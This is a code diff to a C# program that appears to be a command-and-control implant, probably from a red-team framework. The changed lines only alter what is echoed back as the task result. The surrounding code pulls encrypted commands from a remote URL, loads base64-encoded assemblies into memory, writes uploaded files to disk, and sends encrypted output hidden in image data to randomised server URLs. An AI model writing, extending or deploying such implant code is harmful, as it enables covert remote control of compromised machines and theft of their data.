@@ -321,6 +321,7 @@ public class Program
       try {
         string cmd = null;
         string x = "";
+        string tasksrc = "";
         try {
           cmd = GetWebRequest(null).DownloadString(URL);
           x = Decryption(Key, cmd);
@@ -332,6 +333,7 @@ public class Program
       		string[] split = splitcmd.Split(new string[] {"!d-3dion@LD!-d"}, StringSplitOptions.RemoveEmptyEntries);
       		foreach (string c in split)
       		{
+            tasksrc = c;
             output = "";
             //add upload-file
                       
@@ -339,6 +341,7 @@ public class Program
 	            string module = Regex.Replace(c, "loadmodule", "", RegexOptions.IgnoreCase);
               Assembly assembly = System.Reflection.Assembly.Load(System.Convert.FromBase64String(module));
               output += "Module loaded sucessfully";
+              tasksrc = "Module loaded sucessfully";
             }
 
             if (c.ToLower().StartsWith("upload-file")){
@@ -347,6 +350,7 @@ public class Program
               Console.WriteLine("Uploaded file to: " + splitargs[1]);
               byte[] fileBytes = Convert.FromBase64String(splitargs[0]);
               System.IO.File.WriteAllBytes(splitargs[1].Replace("\"", ""), fileBytes);
+              tasksrc = "Uploaded file sucessfully";
             }
 
             if (c.ToLower().StartsWith("download-file")){
@@ -497,7 +501,7 @@ public class Program
             URL = stringnewURLS[rnd.Next(stringnewURLS.Length)];
             G = (Guid.NewGuid()).ToString();
         		URL = baseURL+"/"+URL+G+"/?"+RandomURI;
-            string task = Encryption(Key, c);
+            string task = Encryption(Key, tasksrc);
             string coutput = Encryption(Key, output, true);
             byte[] outputBytes = System.Convert.FromBase64String(coutput);
             byte[] sendBytes = GetImgData(outputBytes, stringnewIMGS);
